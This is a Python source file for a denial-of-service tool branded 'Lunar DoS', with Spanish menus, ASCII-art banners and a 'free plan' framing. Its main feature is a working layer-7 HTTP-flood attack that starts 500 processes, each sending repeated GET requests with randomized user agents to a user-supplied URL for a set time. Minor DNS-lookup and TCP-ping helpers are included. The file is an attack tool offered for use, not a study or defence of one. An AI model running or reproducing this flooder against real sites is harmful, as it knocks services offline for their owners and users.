from colorama import Fore, Style, Back, init
import httpx
import random
from fake_useragent import UserAgent
import os
import time
from multiprocessing import Process
import sys
import signal
import ipaddress
import socket
from typing import Tuple

init()
os.system("clear")
print(f"""{Style.BRIGHT}
{Fore.RED}
⠀⠀          ⠀⠀⠀         ⠀⢀⡤⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀                   ⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀                   ⢀⣴⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀                   ⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                   ⠀⣼⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                   ⢰⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀{Fore.WHITE}Iniciando Code{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                   ⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀{Fore.WHITE}Plan{Fore.RED}:{Fore.WHITE} FREE{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                   ⢸⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                   ⢸⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                   ⠀⢿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣴⠃
⠀                   ⠘⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀ ⣀⣴⣿⠏⠀
⠀⠀                   ⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣀⣀⣀⣀⣠⣤⣶⣿⣿⣿⠋⠀⠀
⠀⠀⠀⠀                   ⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀
⠀⠀⠀⠀               ⠀    ⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀               ⠀    ⠀⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀                      
{Style.RESET_ALL}
""")
def barra_de_carga(percentage):
    bar_length = 20
    block = int(round(bar_length * percentage))
    progress = Fore.LIGHTGREEN_EX + "█" * block + Style.RESET_ALL + Fore.LIGHTBLACK_EX + "-" * (bar_length - block) + Style.RESET_ALL
    return f"                      [{progress}] {percentage * 100:.0f}% Iniciando"

def actualizar_barra(porcentaje):
    sys.stdout.write("\r" + barra_de_carga(porcentaje))
    sys.stdout.flush()

for i in range(101):
    time.sleep(00.039)
    porcentaje = i / 100.0
    actualizar_barra(porcentaje)

print("\nComenzando.......")
# MEDIR PING
def medir_ping(ip, puerto):
    try:
        cliente_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cliente_socket.settimeout(1)
        tiempo_inicio = time.time()
        cliente_socket.connect((ip, puerto))
        tiempo_fin = time.time()
        rtt = tiempo_fin - tiempo_inicio
        print(f"{Style.BRIGHT}{Fore.CYAN}Ping a {ip}:{puerto} - RTT: {rtt:.4f} s")
        
    except socket.error as e:
        print(f"{Style.BRIGHT}{Fore.RED}Error {ip}:{puerto}: {e}{Style.RESET_ALL}")
    finally:
        cliente_socket.close()
# TIEMPO - ACTUAL
def tiempo_actual():
    current_time_seconds = time.time()
    time_tuple = time.localtime(current_time_seconds)
    
    formatted_datetime = time.strftime("%d-%m-%Y - %H:%M:%S", time_tuple)
    
    return formatted_datetime

current_time = tiempo_actual()
# Resolucion DNS
def resolver_dns(dominio):
    try:
        direccion_ip = socket.gethostbyname(dominio)
        print(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}= {Fore.RED}] {Fore.WHITE}IP de {Fore.GREEN}{dominio}{Fore.WHITE} es: {Fore.GREEN}{direccion_ip}{Style.RESET_ALL}")
    except socket.error as e:
        print(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}X {Fore.RED}] {Fore.WHITE}Error: {Fore.RED}{e}{Style.RESET_ALL}")
# HTTP - FLOOD
def send_requests(url, requests_per_second, end_time):
    user_agent = UserAgent()
    client = httpx.Client(http2=True)

    while time.time() < end_time:
        try:
            headers = {
                "User-Agent": user_agent.random,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            }

            response = client.get(url, headers=headers)

        except Exception as e:
            print(f"error {e}")
            
    print("Attack stopped")

def main(url, requests_per_second, num_processes, duration):
    processes = []
    end_time = time.time() + duration

    for _ in range(num_processes):
        process = Process(target=send_requests, args=(url, requests_per_second, end_time))
        processes.append(process)
        process.start()

    for process in processes:
        process.join()

if __name__ == "__main__":
    logo_send = f"""{Style.BRIGHT}{Fore.WHITE}
    
    ░█▀▀░█▀▀░█▀▀▄░█▀▄░░░█▀▀░█░▒█░█▀▄░█▀▄░█▀▀░█▀▀░█▀▀░█▀▀░█░▒█░█░
    ░▀▀▄░█▀▀░█░▒█░█░█░░░▀▀▄░█░▒█░█░░░█░░░█▀▀░▀▀▄░▀▀▄░█▀░░█░▒█░█░
    ░▀▀▀░▀▀▀░▀░░▀░▀▀░░░░▀▀▀░░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀░░░░▀▀▀░▀▀

    {Style.RESET_ALL}
    """
    os.system("clear")
    tools_logo = f"""{Style.BRIGHT}
                                 {Fore.RED}---------------------------
                                 | {Fore.RED}》{Fore.YELLOW}dns{Fore.RED}   | {Fore.BLACK}resolver dns{Fore.RED}  |
                                 | {Fore.RED}》{Fore.YELLOW}ping{Fore.RED}  | {Fore.BLACK}ping for port{Fore.RED} |
                                 ---------------------------
   {Style.RESET_ALL}
    """
    layer7_logo = f"""{Style.BRIGHT}
                            {Fore.RED}---------------------------------------------
                            | {Fore.RED}》{Fore.YELLOW}http-flood{Fore.RED}  | {Fore.BLACK}     Requests - GET{Fore.RED}       |
                            ---------------------------------------------
   {Style.RESET_ALL}
    """
    menu = f"""{Style.BRIGHT}
                                 {Fore.RED}--------------------------------
                                 | {Fore.RED}》{Fore.YELLOW}layer7{Fore.RED}  | {Fore.BLACK}10k r/s - 11k r/s {Fore.RED}|
                                 | {Fore.RED}》{Fore.YELLOW}tools{Fore.RED}   | {Fore.BLACK}   DNS - PING{Fore.RED}    |
                                 --------------------------------
   {Style.RESET_ALL}
    """
    logo = f"""{Style.BRIGHT}
                         {Fore.BLUE}PLAN: {Fore.CYAN}FREE{Fore.WHITE} | {Fore.BLUE}POTENCIA: {Fore.CYAN}10%{Fore.WHITE} | {Fore.BLUE}TIME: {Fore.CYAN}UNLIMITED{Fore.WHITE}
    
             ██▓    █    ██  ███▄    █  ▄▄▄      ██▀███       ▓█████▄  ▒█████    ██████ 
            ▓██▒    ██  ▓██▒ ██ ▀█   █ ▒████▄   ▓██ ▒ ██▒     ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
            ▒██░   ▓██  ▒██░▓██  ▀█ ██▒▒██  ▀█▄ ▓██ ░▄█ ▒     ░██   █▌▒██░  ██▒░ ▓██▄   
            ▒██░   ▓▓█  ░██░▓██▒  ▐▌██▒░██▄▄▄▄██▒██▀▀█▄      ▒░▓█▄   ▌▒██   ██░  ▒   ██▒
            ░██████▒▒█████▓ ▒██░   ▓██░▒▓█   ▓██░██▓ ▒██▒    ░░▒████▓ ░ ████▓▒░▒██████▒▒
            ░ ▒░▓  ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░▒▒   ▓▒█░ ▒▓ ░▒▓░    ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
            ░ ░ ▒  ░░▒░ ░ ░ ░ ░░   ░ ▒░░ ░   ▒▒   ░▒ ░ ▒       ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░  
              ░ ░   ░░░ ░ ░    ░   ░ ░   ░   ▒    ░░   ░       ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                ░     ░              ░       ░     ░             ░        ░ ░        ░  

        {Fore.RED}[{Fore.WHITE} @ {Fore.RED}]{Fore.WHITE} Lunar Community   {Fore.RED}|{Fore.WHITE}  CREADOR: Apolo.py   {Fore.RED}|{Fore.WHITE}  2024  {Fore.RED}| {Fore.BLUE}DC: {Fore.WHITE}apolo1061
    {Style.RESET_ALL}"""
    print(logo)
    print(menu)
    methodos = input(f"{Style.BRIGHT}{Fore.WHITE}LUNAR{Fore.GREEN}@{Fore.WHITE}FREE{Fore.WHITE}-{Fore.RED}》{Style.RESET_ALL}")
    if methodos == "layer7":
        os.system("clear")
        print(logo)
        print(layer7_logo)
        eleccion25 = input(f"{Style.BRIGHT}{Fore.WHITE}LUNAR{Fore.GREEN}@{Fore.WHITE}FREE{Fore.WHITE}-{Fore.RED}》{Style.RESET_ALL}")
        if eleccion25 == "http-flood":
            os.system("clear")
            print(logo)
            url = input(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}? {Fore.RED}] {Fore.CYAN}URL: {Style.RESET_ALL}")
            requests_per_second = 500
            num_processes = 500
            duration = int(input(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}? {Fore.RED}] {Fore.CYAN}TIME: {Style.RESET_ALL}"))
            logo_send5 = f"""{Style.BRIGHT}{Fore.WHITE}
            DESTINY {Fore.RED}|{Fore.CYAN} {url}
            {Fore.WHITE}PORT    {Fore.RED}|{Fore.CYAN} 443
            {Fore.WHITE}METHOD  {Fore.RED}|{Fore.CYAN} HTTP-FLOOD
            {Fore.WHITE}TYPE    {Fore.RED}|{Fore.CYAN} Layer7
            {Fore.WHITE}TIME    {Fore.RED}|{Fore.CYAN} {duration}{Fore.WHITE}s
            DATE    {Fore.RED}|{Fore.CYAN} {current_time}
            {Fore.WHITE}POWER   {Fore.RED}|{Fore.CYAN} 10{Fore.WHITE}%
            PLAN    {Fore.RED}|{Fore.CYAN} FREE
            
            {Style.RESET_ALL}"""
            os.system("clear")
            print(logo)
            print(logo_send5)
            main(url, requests_per_second, num_processes, duration)
    elif methodos == "tools":
        os.system("clear")
        print(logo)
        print(tools_logo)
        eleccion3 = input(f"{Style.BRIGHT}{Fore.WHITE}LUNAR{Fore.GREEN}@{Fore.WHITE}FREE{Fore.WHITE}-{Fore.RED}》{Style.RESET_ALL}")
        if eleccion3 == "dns":
            print(f"")
            dominio = input(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}+ {Fore.RED}] {Fore.WHITE}Ingrese DNS: {Style.RESET_ALL}")
            resolver_dns(dominio)
        elif eleccion3 == "ping":
            os.system("clear")
            print(logo)
            ip_ping = input(f"{Style.BRIGHT}{Fore.CYAN}IP:{Style.RESET_ALL} ")
            port_ping = int(input(f"{Style.BRIGHT}{Fore.CYAN}PORT:{Style.RESET_ALL} "))
            medir_ping(ip_ping, port_ping)
    else: 
        print(f"{Style.BRIGHT}{Fore.RED}ERROR{Style.RESET_ALL}")
